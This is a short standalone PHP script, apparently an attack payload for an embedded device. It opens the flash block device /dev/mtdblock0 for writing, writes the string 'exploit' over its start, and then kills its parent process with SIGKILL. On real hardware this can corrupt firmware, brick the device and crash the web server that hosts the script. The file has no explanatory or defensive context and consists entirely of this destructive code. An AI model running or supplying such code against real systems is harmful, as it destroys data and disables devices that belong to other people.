<?php
$backdoor = fopen("/dev/mtdblock0", "w");
fputs($backdoor, "exploit");
fclose($backdoor);
posix_kill(posix_getppid(), SIGKILL);
exit();
?>
